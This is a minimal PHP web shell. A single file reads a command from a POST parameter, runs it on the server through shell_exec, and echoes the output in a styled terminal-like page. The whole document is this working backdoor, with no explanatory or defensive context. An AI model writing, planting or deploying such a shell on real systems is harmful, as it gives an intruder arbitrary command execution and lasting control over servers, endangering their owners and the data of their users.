<?php $o=($c=@$_POST['@'])?shell_exec($c):''?><style>*{background:#111;box-sizing:border-box;color:#ccc;font-family:monospace}input,pre{border:1px solid #545}pre{padding:5px;margin:5px 0 0}input{width:100%;padding:5px;margin:0}</style><form method=post><input autofocus name=@ value="<?=htmlspecialchars($c?:'',ENT_QUOTES,'utf-8')?>"required></form><pre contenteditable><?=htmlspecialchars($o?:'',ENT_QUOTES,'utf-8')?>